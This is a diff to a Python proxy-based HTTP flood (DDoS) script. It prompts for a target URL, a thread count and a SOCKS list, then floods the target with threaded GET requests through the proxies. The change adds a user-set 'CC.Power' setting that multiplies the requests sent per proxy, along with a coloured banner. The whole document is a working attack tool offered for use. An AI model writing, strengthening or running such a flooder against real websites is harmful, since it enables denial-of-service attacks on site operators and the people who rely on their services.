@@ -1,8 +1,9 @@
 import requests
 import random
 from threading import Thread
+from colorama import Fore
 
-print("""    	     .,:ccllllc:,.              
+print(Fore.GREEN + """    	     .,:ccllllc:,.              
           .lOXWMMMMMMMMMWXOo,           
         .lKWMMMMMMMMMMMMMMMMNk:.        
       .oKWMMMMMMMMMMMMMMMMMMMMNx'       
@@ -32,6 +33,7 @@ def main():
 	global list
 	global proxy
 	global url
+	global pow
 	url = str(input("Target : "))
 	thr = int(input("Threads : "))
 	cho = str(input("Get Some Fresh Socks ? (y/n) : "))
@@ -42,6 +44,7 @@ def main():
 	else:
 		pass
 	list = str(input("Socks List (socks.txt): "))
+	pow = int(input("CC.Power (1-100) : "))
 	for x in range(thr):
 		x = Thread(target=atk, name=(x))
 		x.start()
@@ -58,7 +61,7 @@ def atk():
 			s.get(url)
 			print("Socks Ddos From ~ / " + str(proxy[0])+":"+str(proxy[1]))
 			try:
-				for y in range(10):
+				for y in range(pow):
 					s.get(url)
 			except:
 				s.close()
